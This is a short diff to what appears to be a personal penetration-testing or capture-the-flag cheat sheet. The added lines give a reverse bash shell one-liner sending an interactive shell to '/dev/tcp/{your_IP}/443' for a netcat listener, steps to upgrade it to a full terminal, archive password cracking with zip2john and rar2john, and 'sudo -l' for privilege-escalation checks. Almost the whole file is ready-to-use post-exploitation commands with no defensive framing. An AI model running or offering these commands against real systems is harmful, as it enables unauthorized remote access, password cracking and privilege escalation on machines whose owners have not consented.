@@ -1,2 +1,15 @@
-python3 -c 'import pty;pty.spawn("/bin/bash")'  # shell via python
-zip2john \ rar2john                             # crack archives  via johntheripepr
+python3 -c 'import pty;pty.spawn("/bin/bash")'        # shell via python
+zip2john \ rar2john                                   # crack archives  via johntheripepr
+
+
+bash -c "bash -i >& /dev/tcp/{your_IP}/443 0>&1"      # revers bash via "nc -lvnp 443"
+###make bash interactive##
+python3 -c 'import pty;pty.spawn("/bin/bash")'        # shell via python
+CTRL+Z
+stty raw -echo
+fg
+export TERM=xterm
+
+№№№№№№№№№№№№№№№№№№№№№№№№№№№№№№
+
+sudo -l                                               # check aviable commands
